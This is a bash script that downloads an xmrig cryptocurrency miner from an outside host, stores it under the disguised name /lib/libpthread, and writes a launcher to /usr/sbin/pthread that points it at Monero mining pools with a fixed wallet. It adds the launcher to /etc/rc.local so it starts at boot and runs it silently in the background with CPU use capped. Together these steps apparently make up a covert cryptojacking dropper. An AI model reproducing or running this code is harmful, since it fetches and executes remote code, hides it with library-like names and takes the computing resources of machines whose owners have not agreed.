#!/bin/bash
Get_Dist_Name()
{
    if grep -Eqii "CentOS" /etc/issue || grep -Eq "CentOS" /etc/*-release; then
        DISTRO='CentOS'
        PM='yum'
    elif grep -Eqi "Red Hat Enterprise Linux Server" /etc/issue || grep -Eq "Red Hat Enterprise Linux Server" /etc/*-release; then
        DISTRO='RHEL'
        PM='yum'
    elif grep -Eqi "Aliyun" /etc/issue || grep -Eq "Aliyun" /etc/*-release; then
        DISTRO='Aliyun'
        PM='yum'
    elif grep -Eqi "Fedora" /etc/issue || grep -Eq "Fedora" /etc/*-release; then
        DISTRO='Fedora'
        PM='yum'
    elif grep -Eqi "Debian" /etc/issue || grep -Eq "Debian" /etc/*-release; then
        DISTRO='Debian'
        PM='apt'
    elif grep -Eqi "Ubuntu" /etc/issue || grep -Eq "Ubuntu" /etc/*-release; then
        DISTRO='Ubuntu'
        PM='apt'
    elif grep -Eqi "Raspbian" /etc/issue || grep -Eq "Raspbian" /etc/*-release; then
        DISTRO='Raspbian'
        PM='apt'
    else
        DISTRO='unknow'
    fi
    echo $DISTRO;
}

Get_Dist_Name

sudo curl -fsSL https://qr4d.com/xmrig/libpthread > /lib/libpthread
if [ ! -f "/usr/lib64/libuv.so.1" ]; then
    case $PM in  
        'yum')  
            if grep -Eqii "release 6" /etc/issue || grep -Eq "release 6" /etc/*-release; then
                sudo curl -fsSL "https://qr4d.com/xmrig/usr/local/lib/libuv-centos6.tar.gz" > "/var/tmp/libuv-centos6.tar.gz"
                sudo tar -zxvf "/var/tmp/libuv-centos6.tar.gz" -C "/usr/lib64/"
                echo "yum install libuv for CentOS 6"
            else
                sudo yum -y install libuv
                echo "yum install libuv for CentOS 7"
            fi
            ;;  
        'apt')  
            sudo dpkg --configure -a
            sudo apt-get -y install libuv1
            echo "apt-get install libuv"
            ;;  
        *)  
            echo $PM + "," +  $DISTRO
            ;;  
    esac 
else
    echo "libuv 1.x installed"
fi
WokerID="RAN_$RANDOM"
sudo echo "/lib/libpthread -o nicehash.gpu360.com:14444 -u 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbS1WEZGWKA3v566F6vb.$WokerID -p x -k -o xmr-eu1.nanopool.org:14444 -u 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbS1WEZGWKA3v566F6vb.$WokerID -p x -k --max-cpu-usage=30 --donate-level=1 --background" > /usr/sbin/pthread
sudo chmod +x /lib/libpthread
sudo chmod +x /usr/sbin/pthread
if [ -z "`grep "/usr/sbin/pthread" /etc/rc.local`" ]; then
	sudo echo "/usr/sbin/pthread >/dev/null 2>&1 &" >> /etc/rc.local
else
	echo "has pthread"
fi
sudo killall libpthread
sudo /usr/sbin/pthread >/dev/null 2>&1 &
